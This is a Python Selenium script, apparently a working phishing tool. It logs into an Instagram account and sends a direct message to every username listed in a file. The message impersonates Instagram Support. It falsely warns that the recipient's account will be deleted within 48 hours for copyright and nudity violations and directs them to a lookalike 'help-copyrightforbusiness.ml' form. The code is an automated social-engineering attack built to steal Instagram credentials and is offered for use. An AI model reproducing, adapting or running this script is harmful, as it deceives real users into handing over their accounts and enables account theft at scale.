from selenium import webdriver
import time
from selenium.webdriver.chrome.options import Options
sev = """ Copyright | Instagram
Instagram Support Account ID: 715824030
Hi Dear User!
We have received complaints that you violate instagram copyright and our community guidelines.
our team has reviewed and confirmed the complaints.
Rules you violate;

• Artificial followers and likes

• Copyrighted posts

• Imitation product sale

• Nudity and sexual content


Copyright infringement is against our guidelines !
Your account will be permanently deleted within 48 hours.
If you think we've made a mistake, give feedback from the form below.

Form: https://help-copyrightforbusiness.ml

@ Instagram, Facebook Inc., 1601 Willow Road, Menlo Park, CA 94025 """
def banner():
    print("""
         /--\    \/  //  /\   /  \/
        /    \   /\  /\  \/  /   /\  CoDer : Axroix
    """)

def sikayet_et():
    read = open("userlist.txt","r")
    for i in read:
        try:


            oku = read.readline()
            time.sleep(6)
            browser.find_element_by_xpath("/html/body/div[1]/section/nav/div[2]/div/div/div[2]/div/div").click()
            time.sleep(2)
            browser.find_element_by_xpath("/html/body/div[1]/section/nav/div[2]/div/div/div[2]/input").send_keys(str(oku))
            time.sleep(2)
            browser.find_element_by_xpath("/html/body/div[1]/section/nav/div[2]/div/div/div[2]/div[3]/div/div[2]/div/div[1]/a/div/div[2]/div[1]/div/div/div").click()
            time.sleep(4)
            browser.find_element_by_xpath("/html/body/div[1]/section/main/div/header/section/div[1]/div[1]/div/div/div/span/span[1]/button").click()
            time.sleep(2)
            browser.find_element_by_xpath("/html/body/div[1]/section/main/div/header/section/div[1]/div[1]/div/div[1]/div/button").click()
            time.sleep(5)
            browser.find_element_by_xpath('//textarea[@placeholder="Mesaj..."]').send_keys(sev)
            time.sleep(2)
            browser.find_element_by_xpath("/html/body/div[1]/section/div/div[2]/div/div/div[2]/div[2]/div/div[2]/div/div/div[3]/button").click()
            time.sleep(3)
            browser.get("https://www.instagram.com/")
        except:
            print("Gizli hesap !"+str(read))
            continue
browser = webdriver.Chrome(executable_path="chromedriver.exe")
browser.get("https://www.instagram.com/")
time.sleep(5)
browser.find_element_by_name("username").send_keys("kullanici adin")
browser.find_element_by_name("password").send_keys("Sifren")
time.sleep(2)
browser.find_element_by_xpath(
                "/html/body/div[1]/section/main/article/div[2]/div[1]/div/form/div/div[3]/button/div").click()
banner()
sikayet_et()
